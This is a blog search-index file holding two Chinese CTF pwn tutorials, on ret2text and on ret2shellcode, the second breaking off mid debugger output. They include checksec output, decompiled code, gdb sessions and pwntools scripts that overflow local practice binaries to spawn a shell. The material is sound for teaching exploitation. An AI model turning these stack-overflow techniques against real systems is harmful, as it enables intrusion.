<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1-ret2text</title>
      <link href="/2025/07/e6972740def5.html"/>
      <url>/2025/07/e6972740def5.html</url>
      
        <content type="html"><![CDATA[<p>随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。</p><p>目前被广泛使用的攻击手法是 <strong>返回导向编程</strong> (Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p><p>使用 ROP 攻击一般得满足如下条件：</p><ul><li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><blockquote><p>点击下载: <a href="../../../../../../../challeges/ret2text">ret2text</a></p></blockquote><p>首先，查看一下程序的保护机制：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。接下来查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD secure          proc near</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD input           = dword ptr -10h</span><br><span class="line">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD ; __unwind &#123;</span><br><span class="line">.text:080485FD                 push    ebp</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 <code>system(&quot;/bin/sh&quot;)</code> 的代码，那么如果我们直接控制程序返回至 <code>0x0804863A</code> ，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae <span class="keyword">in</span> main () at ret2text.c:24</span><br><span class="line">warning: 24ret2text.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> EAX  0xffb62afc ◂— 0</span><br><span class="line"> EBX  0xf52dae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0xf52dc8a0 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf532cb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffb62b68 ◂— 0</span><br><span class="line"> ESP  0xffb62ae0 —▸ 0xffb62afc ◂— 0</span><br><span class="line"> EIP  0x80486ae (main+102) ◂— call gets@plt</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffb62ae0，ebp 为 0xffb62b68，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s 的地址为 0xffb62afc</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; cyclic 512</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; 回车</span><br><span class="line">pwndbg&gt; </span><br><span class="line">00:0000│ esp 0xffa5f5cc ◂— 0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">01:0004│     0xffa5f5d0 ◂— 0x62616165 (<span class="string">&#x27;eaab&#x27;</span>)</span><br><span class="line">02:0008│     0xffa5f5d4 ◂— 0x62616166 (<span class="string">&#x27;faab&#x27;</span>)</span><br><span class="line">03:000c│     0xffa5f5d8 ◂— 0x62616167 (<span class="string">&#x27;gaab&#x27;</span>)</span><br><span class="line">04:0010│     0xffa5f5dc ◂— 0x62616168 (<span class="string">&#x27;haab&#x27;</span>)</span><br><span class="line">05:0014│     0xffa5f5e0 ◂— 0x62616169 (<span class="string">&#x27;iaab&#x27;</span>)</span><br><span class="line">06:0018│     0xffa5f5e4 ◂— 0x6261616a (<span class="string">&#x27;jaab&#x27;</span>)</span><br><span class="line">07:001c│     0xffa5f5e8 ◂— 0x6261616b (<span class="string">&#x27;kaab&#x27;</span>)</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure><p>因此最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p>点击下载: <a href="../../../../../../../challeges/ez_pwn">ez_pwn</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出程序是64位小端程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess what I think!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;233 or 666&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">233</span> )</span><br><span class="line">    sub_400726();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">    sub_400737();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">5438</span> )</span><br><span class="line">    sub_400748(<span class="number">5438</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输入5438后会进入 sub_400748</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You find my secret!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So,Tell me your name!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  result = <span class="built_in">printf</span>(<span class="string">&quot;I have remembered you, %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">233</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞，且有 system(“&#x2F;bin&#x2F;sh”)[a1&#x3D;0xe9即可得到],buf 距离 rbp 存在有0x20个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400748 sub_400748      proc near               ; CODE XREF: main+91↓p</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 var_24          = dword ptr -24h</span><br><span class="line">.text:0000000000400748 buf             = byte ptr -20h</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 ; __unwind &#123;</span><br><span class="line">.text:0000000000400748                 push    rbp</span><br><span class="line">.text:0000000000400749                 mov     rbp, rsp</span><br><span class="line">.text:000000000040074C                 sub     rsp, 30h</span><br><span class="line">.text:0000000000400750                 mov     [rbp+var_24], edi</span><br><span class="line">.text:0000000000400753                 mov     edi, offset aYouFindMySecre ; &quot;You find my secret!&quot;</span><br><span class="line">.text:0000000000400758                 call    _puts</span><br><span class="line">.text:000000000040075D                 mov     edi, offset aSoTellMeYourNa ; &quot;So,Tell me your name!&quot;</span><br><span class="line">.text:0000000000400762                 call    _puts</span><br><span class="line">.text:0000000000400767                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040076B                 mov     edx, 50h ; &#x27;P&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400770                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400773                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400778                 mov     eax, 0</span><br><span class="line">.text:000000000040077D                 call    _read</span><br><span class="line">.text:0000000000400782                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400786                 mov     rsi, rax</span><br><span class="line">.text:0000000000400789                 mov     edi, offset format ; &quot;I have remembered you, %s&quot;</span><br><span class="line">.text:000000000040078E                 mov     eax, 0</span><br><span class="line">.text:0000000000400793                 call    _printf</span><br><span class="line">.text:0000000000400798                 cmp     [rbp+var_24], 0E9h</span><br><span class="line">.text:000000000040079F                 jnz     short loc_4007AB</span><br><span class="line">.text:00000000004007A1                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004007A6                 call    _system</span><br><span class="line">.text:00000000004007AB</span><br><span class="line">.text:00000000004007AB loc_4007AB:                             ; CODE XREF: sub_400748+57↑j</span><br><span class="line">.text:00000000004007AB                 nop</span><br><span class="line">.text:00000000004007AC                 leave</span><br><span class="line">.text:00000000004007AD                 retn</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">+-----------------+</span><br><span class="line">| ...             | </span><br><span class="line">+-----------------+</span><br><span class="line">| buf[31]         |  &lt;-- rbp-0x20 + 31</span><br><span class="line">| ...             |</span><br><span class="line">| buf[0]          |  &lt;-- rbp-0x20 (buf起始位置)</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的RBP       |  &lt;-- rbp (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">| 返回地址        |  &lt;-- rbp+0x8</span><br><span class="line">+-----------------+</span><br><span class="line">| ...             |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line">binsh_addr=<span class="number">0x4007a1</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">buf_padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">31</span> + <span class="string">b&#x27;\x00&#x27;</span>  <span class="comment"># 填充buf (32字节), 末尾\x00防止printf乱码</span></span><br><span class="line">rbp_value = p64(<span class="number">0x601040</span>)   <span class="comment">#典型的.bss段起始地址（可通过readelf -S ./binary确认）</span></span><br><span class="line">return_addr = p64(binsh_addr)      <span class="comment"># 覆盖返回地址为system调用处</span></span><br><span class="line">payload = buf_padding + rbp_value + return_addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)  </span><br><span class="line">system_addr = <span class="number">0x4007A1</span>  <span class="comment"># system(&quot;/bin/sh&quot;)地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>      <span class="comment"># 填充buf (32字节)</span></span><br><span class="line">payload += p64(<span class="number">1</span>)        <span class="comment"># 覆盖RBP (任意值)</span></span><br><span class="line">payload += p64(system_addr) <span class="comment"># 覆盖返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>64 位程序，需要处理堆栈平衡<br><code>堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。</code></p><p>64 位程序的ROP链</p><p>程序执行完 <code>pop rdi; ret</code> 后：</p><ul><li><p><code>pop rdi</code> 把 <code>&quot;/bin/sh&quot;</code> 地址拿给 <code>rdi</code>。</p></li><li><p><code>ret</code> 自动去栈顶取下一条指令地址，正好就是 <code>system()</code>。</p></li><li><p><code>system()</code> 一看 <code>rdi</code> 里是 <code>&quot;/bin/sh&quot;</code>，就执行它，shell 就出来</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">|-----------------------| &lt;-- 栈底 (高地址)</span><br><span class="line">| ....(程序原有数据) .....|</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (被覆盖)        | --&gt; 指向 pop rdi; ret (0x4011d2) &lt;-- 你覆盖的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 参数1 (给 pop rdi)     | --&gt; &quot;/bin/sh&quot; 地址 (0x601000)    &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (给 pop rdi 之后的 ret) | --&gt; 指向 system() (0x400530) &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| ... (可能还有更多) .... |</span><br><span class="line">|-----------------------|</span><br><span class="line">| b&#x27;A&#x27; * 32             | &lt;-- 填充的垃圾数据               &lt;-- 你放的</span><br><span class="line">|-----------------------| &lt;-- 栈顶 (低地址) - 你的输入从这里开始</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2shellcode</title>
      <link href="/2025/07/d2926fd10b92.html"/>
      <url>/2025/07/d2926fd10b92.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p><blockquote><p>点击下载: <a href="../../../../../../../challeges/ret2shellcode">ret2shellcode</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">warning: 8ret2shellcode.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> EAX  0x804852d (main) ◂— push ebp</span><br><span class="line"> EBX  0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0x32076bc2</span><br><span class="line"> EDX  0xffffd530 —▸ 0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd508 ◂— 0</span><br><span class="line"> ESP  0xffffd480 —▸ 0xf7ffdb8c —▸ 0xf7fc16f0 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov eax, dword ptr [0x804a060]</span><br><span class="line">───────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────</span><br><span class="line"> ► 0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [stdout@@GLIBC_2.0]     EAX, [stdout@@GLIBC_2.0] =&gt; 0xf7fabd40 (_IO_2_1_stdout_) ◂— 0xfbad2084</span><br><span class="line">   0x804853b &lt;main+14&gt;    mov    dword ptr [esp + 0xc], 0               [0xffffd48c] &lt;= 0</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2                 [0xffffd488] &lt;= 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0                 [0xffffd484] &lt;= 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax                   [0xffffd480] &lt;= 0xf7fabd40 (_IO_2_1_stdout_) ◂— 0xfbad2084</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt                 &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0]      EAX, [stdin@@GLIBC_2.0]</span><br><span class="line">   0x8048560 &lt;main+51&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048568 &lt;main+59&gt;    mov    dword ptr [esp + 8], 1</span><br><span class="line">   0x8048570 &lt;main+67&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048578 &lt;main+75&gt;    mov    dword ptr [esp], eax</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd480 —▸ 0xf7ffdb8c —▸ 0xf7fc16f0 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line">01:0004│-084 0xffffd484 ◂— 1</span><br><span class="line">02:0008│-080 0xffffd488 —▸ 0xf7fc1720 —▸ 0x80482f1 ◂— inc edi /* <span class="string">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class="line">03:000c│-07c 0xffffd48c ◂— 1</span><br><span class="line">04:0010│-078 0xffffd490 ◂— 0</span><br><span class="line">05:0014│-074 0xffffd494 ◂— 1</span><br><span class="line">06:0018│-070 0xffffd498 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line">07:001c│-06c 0xffffd49c ◂— 0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x8048536 main+9</span><br><span class="line">   1 0xf7d9ecb9 __libc_start_call_main+121</span><br><span class="line">   2 0xf7d9ed7c __libc_start_main+140</span><br><span class="line">   3 0x8048451 _start+33</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  vmmap </span><br><span class="line">Start      End       Perm    Size  Offset File(<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line">0x8048000  0x8049000 r-xp    1000       0 ret2shellcode</span><br><span class="line">0x8049000  0x804a000 r--p    1000       0 ret2shellcode</span><br><span class="line">0x804a000  0x804b000 rw-p    1000    1000 ret2shellcode</span><br><span class="line">0xf7d7a000 0xf7d9d000 r--p   23000    0 